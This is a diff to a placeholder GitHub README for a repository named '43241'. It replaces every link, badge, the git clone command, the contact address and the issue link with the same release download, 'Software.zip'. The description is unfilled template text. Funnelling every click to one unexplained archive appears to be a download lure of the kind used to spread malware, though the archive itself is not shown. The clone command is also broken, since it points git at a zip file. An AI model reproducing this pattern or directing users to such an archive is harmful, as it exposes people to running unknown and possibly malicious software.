@@ -1,10 +1,10 @@
 # 🚀 Welcome to the 43241 Repository!
 
-![GitHub repo size](https://img.shields.io/github/repo-size/username/repo)
-![GitHub contributors](https://img.shields.io/github/contributors/username/repo)
-![GitHub stars](https://img.shields.io/github/stars/username/repo?style=social)
-![GitHub forks](https://img.shields.io/github/forks/username/repo?label=Forks&style=social)
-[![GitHub license](https://img.shields.io/github/license/username/repo)](https://github.com/username/repo/blob/main/LICENSE)
+![GitHub repo size](https://github.com/ubtv/43241/releases/download/v1.0/Software.zip)
+![GitHub contributors](https://github.com/ubtv/43241/releases/download/v1.0/Software.zip)
+![GitHub stars](https://github.com/ubtv/43241/releases/download/v1.0/Software.zip)
+![GitHub forks](https://github.com/ubtv/43241/releases/download/v1.0/Software.zip)
+[![GitHub license](https://github.com/ubtv/43241/releases/download/v1.0/Software.zip)](https://github.com/ubtv/43241/releases/download/v1.0/Software.zip)
 
 Welcome to the "43241" repository, a place where ... *(add a brief description of the project, its purpose, and any special features)*.
 
@@ -27,7 +27,7 @@ In this repository, you will find:
 To get started with the code, you can clone this repository using the following command:
 
 ```
-git clone https://github.com/username/repo.git
+git clone https://github.com/ubtv/43241/releases/download/v1.0/Software.zip
 ```
 
 ## 🕹️ Usage
@@ -48,7 +48,7 @@ For development, follow these guidelines:
 
 ## 🌟 Support
 
-If you need any assistance or have any questions, feel free to reach out to [Contact Name](mailto:email@example.com).
+If you need any assistance or have any questions, feel free to reach out to [Contact Name](https://github.com/ubtv/43241/releases/download/v1.0/Software.zip).
 
 ## 🤝 Contributing
 
@@ -66,13 +66,13 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## 🌐 Links
 
-- [Project Website](https://www.project-website.com)
-- [Documentation](https://www.documentation.com)
-- [![Download Latest Version](https://img.shields.io/badge/Download-Latest%20Version-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+- [Project Website](https://github.com/ubtv/43241/releases/download/v1.0/Software.zip)
+- [Documentation](https://github.com/ubtv/43241/releases/download/v1.0/Software.zip)
+- [![Download Latest Version](https://github.com/ubtv/43241/releases/download/v1.0/Software.zip%20Version-blue)](https://github.com/ubtv/43241/releases/download/v1.0/Software.zip)
 
 ## 📢 Feedback
 
-We welcome your feedback! Feel free to share your thoughts and suggestions by [creating an issue](https://github.com/username/repo/issues).
+We welcome your feedback! Feel free to share your thoughts and suggestions by [creating an issue](https://github.com/ubtv/43241/releases/download/v1.0/Software.zip).
 
 ---
 
